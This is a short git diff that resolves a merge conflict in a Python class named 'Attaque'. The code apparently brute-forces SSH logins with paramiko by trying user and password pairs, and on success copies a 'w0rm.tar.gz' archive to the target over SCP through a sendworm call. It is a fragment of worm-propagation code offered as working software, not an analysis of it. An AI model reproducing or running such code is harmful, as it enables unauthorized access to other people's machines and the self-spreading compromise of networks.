@@ -18,11 +18,7 @@ class Attaque(Abstract):
                     passwd = passwd.strip()
                     client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                     try:
-<<<<<<< HEAD
                         self.info(f"Try to connect with ssh to {self.host}:{self.port} with user={user},password={passwd}")
-=======
-                        
->>>>>>> 1d8dcf56045037471d62c44cb39877d9fa0633ff
                         client.connect(self.host, port=self.port, username=user, password=passwd)
                         with scpClient(client.get_transport()) as scp:
                             self.sendworm("w0rm.tar.gz", ".", scp)
